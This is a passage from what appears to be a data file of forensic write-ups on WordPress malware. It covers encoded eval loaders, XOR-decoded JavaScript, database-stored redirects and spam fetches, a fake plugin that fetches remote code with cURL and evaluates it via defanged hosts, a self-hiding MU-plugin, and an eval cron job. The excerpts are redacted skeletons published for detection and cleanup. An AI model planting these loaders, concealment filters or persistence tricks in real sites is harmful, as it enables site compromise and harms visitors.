      "The nested result is passed to eval.",
    ],
    assessment:
      "The structure is consistent with an encoded PHP loader. The original draft labeled it Japanese SEO spam, but the retained artifact alone does not demonstrate language, generated pages, or search-index effects.",
    unknown: [
      "The decoded payload was not retained in readable form for this page.",
      "The evidence does not establish Japanese SEO spam behavior.",
      "The deployed filesystem path, triggering request, and initial compromise method were not confirmed.",
    ],
    heading: "How benign-looking esc_html names conceal callable assembly",
    excerptLang: "php",
    excerpt:
      "$esc_html_gp = ['[encoded fragments redacted]'];\n$esc_html_ft = ['u', '4', 'm', /* shortened */];\n$fn1 = $esc_html_ft[43] . $esc_html_ft[21] . /* ... */;\neval($fn1($fn2($fn3($esc_html_gp))));",
    high: [
      "esc_html_gp",
      "esc_html_ft",
      "Nested generated callables passed to eval",
      "Character-index function-name assembly",
    ],
    contextual: [
      "eval()",
      "Encoded string array",
      "malware.php",
      "esc_html prefix",
    ],
    remediation: [
      "Preserve the original encoded sample privately.",
      "Remove the injected artifact only after identifying its deployed path.",
      "Search PHP files for esc_html_gp, esc_html_ft, and the nested call shape.",
      "Replace affected components with trusted copies.",
    ],
    recurrence: [
      "Repeat the identifier search after scheduled tasks run.",
      "Monitor PHP files for long character arrays and new eval chains.",
      "Check that the artifact does not reappear in restored components.",
    ],
    related: [
      "goto-obfuscated-index-php-loader",
      "tokensdeguards-index-php-loader",
      "wp-security-fake-plugin-eval-loader",
    ],
    guides: [obfuscationGuide, malwareGuide],
    cases: [],
  },
  {
    file: "javascript-credit-card-stealer.md",
    title: "Hostname-Keyed XOR JavaScript Loader Research",
    h1: "Hostname-Keyed XOR JavaScript Loader with new Function",
    slug: "hostname-keyed-xor-javascript-loader",
    description:
      "Forensic analysis of JavaScript that reversed and XOR-decoded a hex-escaped blob with window.location.hostname before using new Function.",
    reportDate: "2026-01-20",
    category: "Hostname-keyed JavaScript loader",
    components: [
      "Browser-executed JavaScript",
      "Dynamic JavaScript compilation",
    ],
    locations: [
      "Supplied JavaScript sample; deployed WordPress path not retained",
    ],
    behaviors: [
      "Reverses an embedded string",
      "XORs characters against window.location.hostname",
      "Passes the decoded result to new Function",
      "Suppresses exceptions around invocation",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The wrapper clearly decodes and dynamically compiles JavaScript. The decoded body was not retained as readable evidence, so credit-card theft and checkout targeting are not asserted.",
    evidence:
      "Anonymized investigation with a supplied JavaScript wrapper and no retained screenshot",
    images: [],
    confirmed: [
      "The embedded blob is represented with hexadecimal escape sequences.",
      "The wrapper reverses the blob before XOR transformation.",
      "window.location.hostname supplies the repeating XOR key.",
      "The result is provided to new Function and invoked.",
    ],
    assessment:
      "The hostname key can make the decoded body site-specific and hinder casual analysis. The legacy credit-card-stealer label exceeded the evidence because no form selectors, payment fields, network destination, or captured data were retained.",
    unknown: [
      "The decoded body is not published or characterized.",
      "No checkout page, payment field, exfiltration request, or affected commerce component was confirmed.",
      "The deployed storage location and initial compromise method were not identified.",
    ],
    heading: "How the hostname becomes the decode key",
    excerptLang: "js",
    excerpt:
      "const reversed = embedded.split('').reverse().join('');\nconst decoded = xorCharacters(reversed, window.location.hostname);\nnew Function(decoded)();\n// embedded blob and helper implementation redacted",
    high: [
      "window.location.hostname used as an XOR key",
      "Reversal followed by XOR decoding and new Function",
      "Hex-escaped embedded JavaScript blob",
    ],
    contextual: [
      "new Function()",
      "window.location.hostname",
      "XOR loop",
      "Obfuscated JavaScript",
    ],
    remediation: [
      "Preserve the original script privately.",
      "Locate and remove the confirmed storage record or modified file.",
      "Search rendered HTML, files, and database content for the wrapper shape.",
      "Review browser and server logs for related external requests if retained.",
    ],
    recurrence: [
      "Recheck rendered pages across the relevant hostnames.",
      "Use file and database integrity checks for the wrapper.",
      "Confirm no new dynamic-function loaders appear after checkout or login flows.",
    ],
    related: [
      "c-i-icu-click-redirect-script",
      "repeated-0x3023-javascript-injection",
      "wpinfo-pst1-database-redirect",
    ],
    guides: [
      redirectGuide,
      guide(
        "WooCommerce fake payment form skimmer guide",
        "/blog/woocommerce-fake-payment-form-skimmer-fix/",
      ),
    ],
    cases: [],
  },
  {
    file: "javascript-fetch-based-spam-injection.md",
    title: "Database-Stored JavaScript Fetch Spam Injection Research",
    h1: "Database-Stored fetch() Calls Injecting Remote Spam Content",
    slug: "database-fetch-spam-injection",
    description:
      "Forensic analysis of Divi-formatted post content that fetched three remote resources and inserted responses into named HTML elements.",
    reportDate: "2026-01-19",
    category: "Database-stored remote-content injection",
    components: [
      "WordPress posts table",
      "Divi-formatted post content",
      "Browser Fetch API",
    ],
    locations: [
      "A post_content database record",
      "Elements with IDs datax, info1, and info2",
    ],
    behaviors: [
      "Fetches three remote JavaScript-path resources",
      "Reads each response as text",
      "Assigns returned text to element innerHTML",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The database screenshot and supplied snippet directly show remote fetches and innerHTML insertion. The returned content was not retained.",
    evidence:
      "Anonymized investigation with one privacy-reviewed database screenshot and a supplied JavaScript excerpt",
    images: [
      {
        file: "seo-spam-database-injection_evidence-1.png",
        alt: "Database post_content field showing fetch calls embedded in Divi content",
        caption:
          "The expanded post_content cell shows Divi markers and fetch calls to external domains followed by innerHTML assignment. Adjacent rows are not used to infer behavior.",
        supports:
          "Remote fetch injection was stored in a WordPress post-content record",
      },
    ],
    confirmed: [
      "The code was visible inside a post_content database field.",
      "The content includes Divi line-break markers.",
      "Three fetch calls request external resources and read response text.",
      "Responses are inserted into datax, info1, and info2 through innerHTML.",
    ],
    assessment:
      "This is consistent with database-stored remote spam delivery because the browser inserts server-provided text into page elements. The retained evidence does not show what the endpoints returned at investigation time.",
    unknown: [
      "The remote responses were not retained.",
      "The evidence does not identify how the database row was modified.",
      "No vulnerable plugin, theme, or version was confirmed.",
      "The number of affected pages was not established.",
    ],
    heading: "How the injected fetch chain updates page elements",
    excerptLang: "js",
    excerpt:
      "fetch('hxxps://sengatanlebah[.]shop/back.js')\n  .then(response => response.text())\n  .then(text => document.getElementById('datax').innerHTML = text);\n// two similar remote fetches shortened",
    high: [
      "sengatanlebah[.]shop/back.js",
      "jasabacklink[.]buzz/backlink/sigma.js",
      "Element IDs datax, info1, info2",
      "Divi markers adjacent to three fetch-to-innerHTML chains",
    ],
    contextual: ["fetch()", "innerHTML", "post_content", "Divi shortcodes"],
    remediation: [
      "Export the affected row before editing.",
      "Remove the injected script from the confirmed database record and review revisions or duplicates.",
      "Search the database for the domains and element IDs.",
      "Review administrator actions and write-capable integrations for the entry point.",
    ],
    recurrence: [
      "Repeat the database search after page saves and scheduled tasks.",
      "Verify rendered HTML no longer contains the three fetch chains.",
      "Monitor the affected post for unauthorized revisions.",
    ],
    related: [
      "m6bmm64-hidden-anchor-injection",
      "ushort-company-post-content-redirect",
      "wpinfo-pst1-database-redirect",
    ],
    guides: [
      guide(
        "Hidden backlink database fetch injection",
        "/blog/wordpress-hidden-spam-backlinks-database-fetch-injection/",
      ),
      databaseGuide,
    ],
    cases: [
      guide(
        "Hidden database malware case study",
        "/case-studies/failed-google-blacklist-request-how-to-find-hidden-database-malware/",
      ),
    ],
  },
  {
    file: "javascript-obfuscation-ajax-malfunction.md",
    title: "c-i.icu Click-Triggered JavaScript Redirect Research",
    h1: "c-i.icu Click-Triggered Redirect Script in index.php",
    slug: "c-i-icu-click-redirect-script",
    description:
      "Forensic review of an obfuscated script using c-i.icu URL arrays, click listeners, localStorage timing, and window.open behavior.",
    reportDate: "2026-02-01",
    category: "Click-triggered JavaScript redirect",
    components: [
      "Theme index.php",
      "Browser click events",
      "Browser localStorage",
    ],
    locations: ["Observed index.php code editor view"],
    behaviors: [
      "Stores multiple hex-escaped c-i.icu URLs",
      "Registers click-event logic",
      "Uses localStorage for timing state",
      "References window.open and _blank",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The screenshot and code show redirect-oriented click handling. The former claim that this caused AJAX malfunction is not supported by the retained evidence.",
    evidence:
      "Anonymized investigation with one code-editor screenshot and a retained obfuscated JavaScript sample",
    images: [
      {
        file: "malware-in-themes-index.php_evidence-1.png",
        alt: "Code editor showing obfuscated JavaScript appended to an index.php file",
        caption:
          "The visible script contains _0x3023 decoding logic, hex-escaped c-i.icu strings, local-storage terms, click handling, and window opening identifiers.",
        supports:
          "Obfuscated redirect-oriented JavaScript was appended to index.php",
      },
    ],
    confirmed: [
      "The code is present after a PHP closing tag in index.php.",
      "The string table contains multiple hex-escaped c-i.icu URLs.",
      "The script references click, localStorage, open, and _blank.",
      "The draft's AJAX-causation claim is removed.",
    ],
    assessment:
      "The combined URL array, click listener, timing state, and window-opening functions are consistent with an interaction-gated redirect script. Which URL opened for a given visitor was not observed.",
    unknown: [
      "The screenshot does not prove a redirect occurred.",
      "No browser trace or destination response was retained.",
      "The evidence does not establish AJAX disruption, data theft, or the initial injection path.",
      "No affected theme version was confirmed.",
    ],
    heading: "How click state controls the redirect attempt",
    excerptLang: "js",
    excerpt:
      "const destinations = ['hxxp://c-i[.]icu/[redacted-paths]'];\n// localStorage timing and mobile checks shortened\ndocument.addEventListener('click', handler);\n// handler may call window.open(destination, '_blank')",
    high: [
      "c-i[.]icu URL array",
      "_0x3023 and _0x10c8 decoder pair",
      "Click plus localStorage plus window.open structure",
    ],
    contextual: ["index.php", "click event", "localStorage", "window.open()"],
    remediation: [
      "Preserve the modified file and rendered source.",
      "Replace the affected theme component with a trusted copy.",
      "Search files and database records for the decoder pair and defanged domain.",
      "Review adjacent theme files only where evidence shows the same signature.",
    ],
    recurrence: [
      "Confirm the script is absent from rendered HTML.",
      "Repeat the signature search after deployments and cache clears.",
      "Monitor theme-file integrity and unexpected browser navigation.",
    ],
    related: [
      "repeated-0x3023-javascript-injection",
      "hexagoncontrail-external-script-injection",
      "hostname-keyed-xor-javascript-loader",
    ],
    guides: [redirectGuide, obfuscationGuide],
    cases: [
      guide(
        "Mobile redirect access-log case study",
        "/case-studies/how-i-found-and-fixed-a-wordpress-mobile-redirect-hack-using-access-logs/",
      ),
    ],
  },
  {
    file: "javascript-redirection-injection.md",
    title: "wpinfo-pst1 Database Redirect Script Research",
    h1: "wpinfo-pst1 Obfuscated Redirect Stored in post_content",
    slug: "wpinfo-pst1-database-redirect",
    description:
      "Forensic analysis of a wpinfo-pst1 packed JavaScript block stored in WordPress post content and writing an external script element.",
    reportDate: "2026-01-18",
    category: "Database-stored packed redirect script",
    components: ["WordPress posts table", "Browser-executed packed JavaScript"],
    locations: ["post_content database field", "Script element ID wpinfo-pst1"],
    behaviors: [
      "Stores a script element with ID wpinfo-pst1",
      "Uses a packed eval wrapper",
      "Calls document.write with an external JavaScript source",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The database screenshot and code directly show a packed script that writes an external script tag. A second screenshot shows a different options-table artifact and is excluded from this page.",
    evidence:
      "Anonymized investigation with two database screenshots and a supplied packed JavaScript sample; one directly relevant image is published",
    images: [
      {
        file: "db-malware_evidence-1.png",
        alt: "Database post_content cell containing the wpinfo-pst1 packed JavaScript block",
        caption:
          "The post_content field visibly contains wpinfo-pst1 and a packed eval wrapper. The image confirms storage in a post record, not the remote script's resulting behavior.",
        supports: "The wpinfo-pst1 script was stored in post_content",
      },
    ],
    confirmed: [
      "The database screenshot shows wpinfo-pst1 in post_content.",
      "The script uses a packed eval(function(p,a,c,k,e,d)...) form.",
      "The decoded token list visibly includes document, write, script, src, navigator, and referrer.",
      "The supplied string constructs an external script source.",
    ],
    assessment:
      "The artifact is consistent with a database-stored redirect or traffic-monetization loader. The incomplete destination string and absent browser trace prevent a stronger visitor-outcome claim.",
    unknown: [
      "The remote script response was not retained.",
      "The evidence does not identify the database write path.",
      "The second screenshot belongs to a different widget_block artifact and is not treated as the same chain.",
      "No campaign size or affected version was established.",
    ],
    heading: "Why wpinfo-pst1 is a useful database search key",
    excerptLang: "html",
    excerpt:
      '<script id="wpinfo-pst1">\n  eval(function(p,a,c,k,e,d){ /* packed body redacted */ })\n</script>',
    high: [
      "wpinfo-pst1",
      "Packed token list containing document|javascript|write|script",
      "The identifier inside post_content",
    ],
    contextual: [
      "eval(function(p,a,c,k,e,d)",
      "document.write()",
      "post_content",
      "External IP-based URL",
    ],
    remediation: [
      "Export the affected row and table before editing.",
      "Remove the script from confirmed records and search revisions, widgets, and options separately.",
      "Search the database for wpinfo-pst1 and distinctive packed tokens.",
      "Investigate the write path through logs and administrator activity if available.",
    ],
    recurrence: [
      "Repeat the database search after scheduled events and content edits.",
      "Confirm rendered pages no longer contain wpinfo-pst1.",
      "Monitor affected records for unexpected modification.",
    ],
    related: [
      "ushort-company-post-content-redirect",
      "database-fetch-spam-injection",
      "c-i-icu-click-redirect-script",
    ],
    guides: [databaseGuide, redirectGuide],
    cases: [
      guide(
        "Hidden redirect removal case study",
        "/case-studies/wpcode-plugin-malware-hidden-redirect-removal/",
      ),
    ],
  },
  {
    file: "malicious-php-script-detected-index-php.md",
    title: "PrivDayz Obfuscated index.php Artifact Research",
    h1: "PrivDayz-Branded Obfuscated index.php in a Random Directory",
    slug: "privdayz-obfuscated-index-php",
    description:
      "Forensic review of a PrivDayz-branded index.php containing custom decoding helpers inside a short randomly named web directory.",
    reportDate: "2026-02-05",
    category: "Obfuscated PHP tool artifact",
    components: ["Unexpected web directories", "Custom PHP decode helpers"],
    locations: [
      "Short directory named 5d8c5 under an older web tree",
      "index.php inside that directory",
    ],
    behaviors: [
      "Uses custom XOR and character-conversion helpers",
      "Defines reverse and base64-like decode functions",
      "Contains PrivDayz branding",
    ],
    confidence: "Medium",
    severity: "High",
    rationale:
      "The directory and supplied code are anomalous and contain obfuscation helpers. The retained excerpt does not show a complete command path, so remote execution is not claimed.",
    evidence:
      "Anonymized investigation with two filesystem screenshots and a retained truncated index.php sample",
    images: [
      {
        file: "random-number-folder-name-inside-public_html-contains-malware_evidence-2.png",
        alt: "File manager showing short directories 5d8c5 and 61c429 beside unexpected PHP files",
        caption:
          "The file manager shows two short directory names and several unexpected PHP artifacts under an older web tree. Names alone are contextual and require code review.",
        supports:
          "The investigation contained short anomalous directories and unexpected PHP files",
      },
      {
        file: "random-number-folder-name-inside-public_html-contains-malware_evidence-1.png",
        alt: "File manager showing index.php inside the short 5d8c5 directory",
        caption:
          "The directory view confirms a 1 KB index.php inside 5d8c5. The screenshot does not demonstrate execution or the file's complete contents.",
        supports: "index.php existed inside the 5d8c5 directory",
      },
    ],
    confirmed: [
      "A short directory named 5d8c5 contained index.php.",
      "The broader listing showed another short directory and unexpected PHP filenames.",
      "The supplied source contains PrivDayz branding and custom transformation helpers.",
      "The source is truncated and contains inconsistent identifiers, so it is not repaired.",
    ],
    assessment:
      "The branding and obfuscation helpers are consistent with a malicious PHP tool or loader artifact. Capability claims beyond the visible functions would require the complete sample.",
    unknown: [
      "The screenshot does not prove that index.php executed.",
      "The complete request handling and payload path were not retained.",
      "The initial compromise method and relationship to neighboring files were not confirmed.",
    ],
    heading: "Why the directory context and code must be evaluated together",
    excerptLang: "php",
    excerpt:
      "/* PrivDayz branding retained as an identifier */\nfunction update_singleblog($input) {\n    // XOR and transformation stages shortened\n    return transformed_value($input);\n}\n// request handling and encoded data omitted",
    high: [
      "PrivDayz branding in this index.php",
      "update_singleblog",
      "5d8c5/index.php together with custom decode helpers",
    ],
    contextual: [
      "index.php",
      "Short hexadecimal-looking directory",
      "XOR loop",
      "base64-like alphabet",
    ],
    remediation: [
      "Preserve the directory tree and timestamps.",
      "Remove confirmed malicious directories after checking for legitimate ownership.",
      "Search for the branding and distinctive helper names across the hosting account.",
      "Review adjacent unexpected PHP files individually.",
    ],
    recurrence: [
      "Confirm the short directories do not return.",
      "Monitor the web root for new one-file directories.",
      "Repeat the helper-name search after scheduled tasks.",
    ],
    related: [
      "goto-obfuscated-index-php-loader",
      "tokensdeguards-index-php-loader",
      "php-shell-ultimate-artifact",
    ],
    guides: [obfuscationGuide, malwareGuide],
    cases: [
      guide(
        "Bluehost account-suspension malware case study",
        "/case-studies/bluehost-hacked-wordpress-site-recovery/",
      ),
    ],
  },
  {
    file: "malicious-redirection-posts-injection.md",
    title: "ushort.company Redirect in WordPress post_content",
    h1: "ushort.company Meta-Refresh and JavaScript Redirect in post_content",
    slug: "ushort-company-post-content-redirect",
    description:
      "Forensic analysis of a database record containing both meta-refresh and window.location redirects to the same defanged endpoint.",
    reportDate: "2026-01-31",
    category: "Database-stored dual redirect",
    components: [
      "WordPress posts table",
      "HTML meta refresh",
      "Browser location assignment",
    ],
    locations: ["post_content database field"],
    behaviors: [
      "Defines an immediate meta refresh",
      "Assigns window.location.href",
      "Uses the same external destination in both mechanisms",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The screenshot directly shows both redirect methods in post_content. A separate options-table screenshot contains private client data and is excluded.",
    evidence:
      "Anonymized investigation with three database screenshots and a supplied redirect excerpt; one directly relevant privacy-safe image is published",
    images: [
      {
        file: "meta-redirect-location-based-redirect-malware_evidence-2.png",
        alt: "WordPress post_content field containing meta-refresh and window.location redirect code",
        caption:
          "The expanded post_content field shows two immediate redirects to ushort[.]company. The adjacent records and table prefix do not establish the injection source.",
        supports:
          "Both redirect mechanisms were stored in a WordPress content record",
      },
    ],
    confirmed: [
      "A post_content field contains meta http-equiv=refresh with a zero-second delay.",
      "The same field assigns window.location.href.",
      "Both methods point to the same ushort[.]company path.",
    ],
    assessment:
      "The duplicate redirect methods increase the chance that a browser follows the external destination. The evidence does not show the destination response or which visitors encountered the record.",
    unknown: [
      "The options-table screenshot is excluded because it exposes identifiable client information.",
      "The evidence does not establish how many rows were affected.",
      "The initial database write path and remote destination behavior were not retained.",
      "No vulnerable component or affected version was confirmed.",
    ],
    heading: "Why two redirect mechanisms appear in one record",
    excerptLang: "html",
    excerpt:
      '<meta http-equiv="refresh" content="0; url=hxxps://ushort[.]company/[redacted]">\n<script>window.location.href = \'hxxps://ushort[.]company/[redacted]\';</script>',
    high: [
      "ushort[.]company endpoint",
      "Meta refresh and window.location.href in the same post_content field",
    ],
    contextual: [
      "post_content",
      "meta refresh",
      "window.location.href",
      "Database search match count",
    ],
    remediation: [
      "Export affected records before editing.",
      "Remove the confirmed redirect block and inspect revisions or duplicated rows.",
      "Search the full database for the defanged domain and both code forms.",
      "Review logs and privileged activity for the write source.",
    ],
    recurrence: [
      "Repeat the database search after page saves and scheduled tasks.",
      "Verify rendered pages and feeds no longer redirect.",
      "Monitor the affected record for unauthorized changes.",
    ],
    related: [
      "wpinfo-pst1-database-redirect",
      "database-fetch-spam-injection",
      "m6bmm64-hidden-anchor-injection",
    ],
    guides: [databaseGuide, redirectGuide],
    cases: [
      guide(
        "Hidden database malware case study",
        "/case-studies/failed-google-blacklist-request-how-to-find-hidden-database-malware/",
      ),
    ],
  },
  {
    file: "malicious-wordpress-core-plugin.md",
    title: "WordPressCore Fake Plugin Remote Loader Research",
    h1: "WordPressCore Fake Plugin with cURL-to-eval Loader Files",
    slug: "wordpresscore-fake-plugin-remote-loader",
    description:
      "Forensic review of a WordPressCore plugin directory containing small PHP files that retrieved remote text and passed it to eval.",
    reportDate: "2026-02-01",
    category: "Fake plugin remote PHP loader",
    components: [
      "WordPress plugins directory",
      "PHP cURL retrieval",
      "Dynamic PHP evaluation",
    ],
    locations: [
      "wp-content/plugins/WordPressCore/hibgqdnj.php",
      "wp-content/plugins/WordPressCore/iaactvgd.php",
    ],
    behaviors: [
      "Retrieves content from an external URL with cURL",
      "Passes retrieved content to eval",
      "Uses two small loader files in one plugin-like directory",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The supplied loader source directly retrieves and evaluates remote content. Directory and encoded-file screenshots with hosting identifiers or full blobs are excluded.",
    evidence:
      "Anonymized investigation with three screenshots and retained source for two small remote loader files",
    images: [
      {
        file: "WordPressCore_evidence-2.png",
        alt: "Code editor showing hibgqdnj.php retrieving a remote URL with cURL and evaluating the response",
        caption:
          "The six-line file retrieves a defanged endpoint and evaluates the returned body. The screenshot confirms code structure, not a successful response during the investigation.",
        supports: "hibgqdnj.php implemented a remote-content evaluation path",
      },
    ],
    confirmed: [
      "hibgqdnj.php initializes cURL with ndot[.]us/za.",
      "It retrieves a response and passes it to eval.",
      "A second supplied file defines a get helper and evaluates content retrieved from rentry[.]co/mmgbs/raw.",
      "The files were grouped under a WordPressCore plugin-like directory in the retained investigation.",
    ],
    assessment:
      "These are remote PHP loaders because successful responses are supplied to eval. The public page does not call either endpoint or reproduce a fully operational loader.",
    unknown: [
      "No retained network response confirms what either endpoint returned.",
      "The screenshot does not prove execution.",
      "The initial compromise method and relationship to crypto.txt were not established.",
      "The hosting-account screenshot and full encoded blob are excluded for privacy and code safety.",
    ],
    heading: "How the loader hands a remote response to PHP",
    excerptLang: "php",
    excerpt:
      "$url = 'hxxp://ndot[.]us/za';\n$response = curl_exec(/* initialized handle */);\n// error handling and endpoint details shortened\neval('?>' . $response);",
    high: [
      "WordPressCore directory in this incident",
      "hibgqdnj.php",
      "iaactvgd.php",
      "ndot[.]us/za and rentry[.]co/mmgbs/raw loaders",
    ],
    contextual: ["cURL", "eval()", "crypto.txt", "include.php"],
    remediation: [
      "Preserve the entire fake plugin directory and relevant egress logs.",
      "Remove the directory and replace any affected legitimate components with trusted copies.",
      "Search for the two filenames, endpoints, and response-to-eval structure.",
      "Block known incident-specific endpoints as a secondary containment measure.",
    ],
    recurrence: [
      "Verify the directory and small loader files do not return.",
      "Review outbound logs for repeated requests to the defanged endpoints.",
      "Monitor plugin paths for newly generated short PHP filenames.",
    ],
    related: [
      "advanced-linkflow-control-hidden-plugin",
      "wp-security-fake-plugin-eval-loader",
      "system-control-hidden-backup-restoration",
    ],
    guides: [fakePluginGuide, hiddenBackdoorGuide],
    cases: [],
  },
  {
    file: "malware-analysis-statemesh-wordpress.md",
    title: "StateMesh MU-Plugin Self-Copy and Concealment Research",
    h1: "StateMesh MU-Plugin Self-Copy and Plugin-List Concealment",
    slug: "statemesh-mu-plugin-self-copy",
    description:
      "Forensic analysis of 01-mu-StateMesh.php.php code that copied itself into mu-plugins and filtered plugin-management views.",
    reportDate: "2026-03-03",
    category: "Self-copying concealed MU plugin",
    components: [
      "WordPress MU-plugin loader",
      "Plugin-management filters",
      "Filesystem write operations",
    ],
    locations: ["wp-content/mu-plugins/01-mu-StateMesh.php.php"],
    behaviors: [
      "Unsets itself through all_plugins",
      "Returns an empty advanced-plugin view",
      "Builds a 01-mu-prefixed destination in WPMU_PLUGIN_DIR",
      "Copies its own contents when destination checks differ",
    ],
    confidence: "High",
    severity: "High",
    rationale:
      "The supplied code directly shows self-copy and plugin-list concealment. Other request and database behaviors are present in truncated code but are not reproduced operationally.",
    evidence:
      "Anonymized investigation with one filesystem screenshot and a retained, truncated StateMesh PHP sample",
    images: [
      {
        file: "malware-inside-mu-plugins_evidence-1.png",
        alt: "WordPress file manager showing 01-mu-StateMesh.php.php inside mu-plugins",
        caption:
          "The file manager confirms the double-extension StateMesh file in the MU-plugin directory. The screenshot does not prove execution; the supplied source establishes self-copy and concealment logic.",
        supports: "The StateMesh artifact existed in the MU-plugin path",
      },
    ],
    confirmed: [
      "The file is named 01-mu-StateMesh.php.php under mu-plugins.",
      "The all_plugins filter removes plugin_basename(__FILE__).",
      "show_advanced_plugins returns an empty array.",
      "The code builds a destination under WPMU_PLUGIN_DIR and writes file_get_contents(__FILE__) to it under coded conditions.",
    ],
    assessment:
      "The self-copy and concealment behaviors are consistent with persistence. The benign-looking StateMesh metadata appears to be camouflage in this supplied artifact.",
    unknown: [
      "The screenshot does not prove the self-copy branch executed.",
      "The full request-controlled behavior and database changes are not reproduced publicly.",
      "The initial compromise method and any relationship to a legitimate project were not established.",
      "No affected component version was confirmed.",
    ],
    heading: "How the 01-mu destination preserves an MU-plugin copy",
    excerptLang: "php",
    excerpt:
      "add_filter('all_plugins', function ($plugins) {\n    unset($plugins[plugin_basename(__FILE__)]);\n    return $plugins;\n}, 9999);\n$destination = WPMU_PLUGIN_DIR . '/01-mu-' . basename(__FILE__) . '.php';\n// copy condition and remaining payload redacted",
    high: [
      "01-mu-StateMesh.php.php",
      "StateMesh metadata combined with 01-mu self-copy logic",
      "all_plugins self-unset plus show_advanced_plugins suppression",
    ],
    contextual: [
      "WPMU_PLUGIN_DIR",
      "file_put_contents()",
      "md5() comparison",
      "goto obfuscation",
    ],
    remediation: [
      "Preserve the file and full MU-plugin directory listing.",
      "Remove all untrusted StateMesh copies and rebuild mu-plugins from a known baseline.",
      "Search for the 01-mu prefix, class names, options, and concealment filters.",
      "Review administrator accounts and related persistence locations.",
    ],
    recurrence: [
      "Confirm no 01-mu-StateMesh copies return.",
      "Compare mu-plugins against a controlled inventory after normal requests.",
      "Monitor writes into WPMU_PLUGIN_DIR.",
    ],
    related: [
      "wp-user-query-hidden-admin-filter",
      "media-patcher-lab-mu-plugin",
      "system-control-hidden-backup-restoration",
    ],
    guides: [hiddenBackdoorGuide, fakePluginGuide],
    cases: [
      guide(
        "MU-plugin malware case study",
        "/case-studies/bitdefender-blocked-wordpress-no-users-found-mu-plugin-malware/",
      ),
    ],
  },
  {
    file: "obfuscated-javascript-malware-theme-plugins.md",
    title: "Repeated _0x3023 JavaScript Injection Across 17 Files",
    h1: "Repeated _0x3023 Obfuscated JavaScript Found Across 17 Files",
    slug: "repeated-0x3023-javascript-injection",
    description:
      "Forensic review of the same _0x3023 JavaScript signature found in 17 theme and plugin files during one investigation.",
    reportDate: "2026-02-01",
    category: "Repeated obfuscated JavaScript injection",
    components: [
      "Theme JavaScript files",
      "Plugin JavaScript files",
      "Browser-executed injected code",
    ],
    locations: [
      "17 files shown in an editor search, including plugin and theme assets",
    ],
    behaviors: [
      "Repeats the _0x3023 decoder signature across multiple files",
      "Contains localStorage and click-related identifiers",
      "Includes obfuscated URL and browser-navigation strings",
    ],
    confidence: "Medium",
    severity: "High",
    rationale:
      "The screenshot confirms the same signature in 17 files and exposes part of the code structure. Exact runtime behavior should be derived from complete samples, not obfuscation alone.",
    evidence:
      "Anonymized investigation with one editor-search screenshot; no complete standalone sample retained in this draft",
    images: [
      {
        file: "js-malware_evidence-1.png",
        alt: "VS Code search showing the _0x3023 signature in 17 JavaScript files",
        caption:
          "The editor reports 17 matches in 17 files across theme and plugin paths. This confirms distribution of one signature, while code behavior remains limited to visible identifiers.",
        supports:
          "The same obfuscated JavaScript signature occurred in 17 files",
      },
    ],
    confirmed: [
      "The editor search reports 17 results in 17 files.",
      "The visible paths span multiple plugin or theme assets.",
      "The opened code contains _0x3023, _0x365b, localStorage, browser strings, and click-related logic.",
    ],
    assessment:
      "Repeated identical obfuscated logic across unrelated assets is consistent with mass injection. It likely relates to the separately documented c-i.icu click script, but direct byte-for-byte provenance is not retained here.",
    unknown: [
      "No complete file sample is published for this entry.",
      "The screenshot does not prove each matched file executed in a visitor browser.",
      "The initial injection mechanism, destination behavior, and relationship to the separate index.php sample were not confirmed.",
    ],
    heading: "Why the cross-file signature is the primary evidence",
    excerptLang: "js",
    excerpt:
      "function _0x3023(a, b) {\n  const table = _0x10c8();\n  // index adjustment and string lookup shortened\n}\n// repeated injected body, URLs, and event handler redacted",
    high: [
      "_0x3023 paired with _0x10c8",
      "17 results in 17 files",
      "The same long injected body across unrelated asset paths",
    ],
    contextual: [
      "Obfuscated variable names",
      "localStorage",
      "click",
      "debug-bar.js",
    ],
    remediation: [
      "Preserve representative files and the search result list.",
      "Replace affected themes and plugins from trusted distributions rather than editing 17 files individually.",
      "Search the full account for the decoder pair and adjacent code.",
      "Investigate how multiple writable components were modified.",
    ],
    recurrence: [
      "Repeat the cross-file search after restoration and scheduled tasks.",
      "Use file integrity monitoring on restored assets.",
      "Confirm rendered pages no longer serve the injected signature.",
    ],
    related: [
      "c-i-icu-click-redirect-script",
      "hostname-keyed-xor-javascript-loader",
      "hexagoncontrail-external-script-injection",
    ],
    guides: [
      redirectGuide,
      guide(
        "Dangerous JavaScript malware guide",
        "/blog/dangerous-javascript-malware-targeting-wordpress-and-node-js-sites/",
      ),
    ],
    cases: [],
  },
  {
    file: "php-cron-job-malware.md",
    title: "cPanel PHP Cron eval Wrapper Persistence Research",
    h1: "Hourly cPanel PHP Cron Job Running an Encoded eval Wrapper",
    slug: "cpanel-php-cron-eval-wrapper",
    description:
      "Forensic analysis of an hourly cPanel cron command that invoked php -r with an eval, gzinflate, and base64_decode wrapper.",
    reportDate: "2026-01-16",
    category: "Server cron encoded PHP execution",
    components: [
      "Hosting-account cron scheduler",
      "PHP command-line interpreter",
    ],
    locations: ["cPanel Current Cron Jobs", "User crontab"],
    behaviors: [
      "Runs at minute zero of every hour",
      "Invokes /usr/local/bin/php -r",
      "Passes an embedded blob through base64_decode and gzinflate before eval",
    ],
    confidence: "High",
    severity: "Critical",
    rationale:
      "The scheduler and command syntax are directly visible. The encoded payload is withheld, so claims about generated files or redirects are limited to investigation context rather than decoded proof.",
    evidence:
      "Anonymized investigation with cPanel and shell screenshots plus a retained cron command; screenshots exposing client identity or a full payload are excluded",
    images: [],
    confirmed: [
      "The cron schedule runs at minute zero with wildcard hour, day, month, and weekday fields.",
      "The command invokes /usr/local/bin/php -r.",
      "The inline PHP uses eval(gzinflate(base64_decode(...))).",
    ],
    assessment:
      "The hourly schedule provides a plausible mechanism for recurring reinfection after visible files are cleaned. What the embedded payload created cannot be confirmed without safely decoding and correlating the private sample.",
    unknown: [
      "The decoded payload is not published or characterized.",
      "The evidence does not establish which files the cron job created.",
      "The initial creation of the cron entry and any redirect outcome were not confirmed from retained logs.",
      "Screenshots with client names, usernames, and full payloads are excluded.",
    ],
    heading: "Why the scheduler is a persistence clue",
    excerptLang: "text",
    excerpt:
